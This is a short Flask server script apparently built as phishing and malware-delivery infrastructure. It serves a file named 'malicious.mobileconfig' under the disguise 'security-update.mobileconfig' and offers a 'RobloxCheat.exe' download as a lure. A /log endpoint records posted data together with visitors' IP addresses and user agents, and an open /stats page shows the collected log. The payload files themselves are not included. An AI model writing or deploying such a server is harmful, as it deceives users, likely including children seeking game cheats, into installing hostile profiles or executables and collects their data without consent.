# server.py
from flask import Flask, send_file, request
import os

app = Flask(__name__)

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/install-profile')
def install_profile():
    return send_file(
        'malicious.mobileconfig',
        as_attachment=True,
        download_name='security-update.mobileconfig',
        mimetype='application/x-apple-aspen-config'
    )

@app.route('/download-cheat')
def download_cheat():
    return send_file(
        'RobloxCheat.exe',
        as_attachment=True,
        download_name='RobloxCheat.exe',
        mimetype='application/octet-stream'
    )

@app.route('/log', methods=['POST'])
def log():
    data = request.get_data().decode('utf-8', errors='ignore')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Unknown')
    
    with open('log.txt', 'a') as f:
        f.write(f"IP: {ip}\nUA: {ua}\nData: {data}\n---\n")
    
    return 'OK', 200

@app.route('/stats')
def stats():
    try:
        with open('log.txt', 'r') as f:
            content = f.read()
        return content, 200
    except:
        return 'No data yet', 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
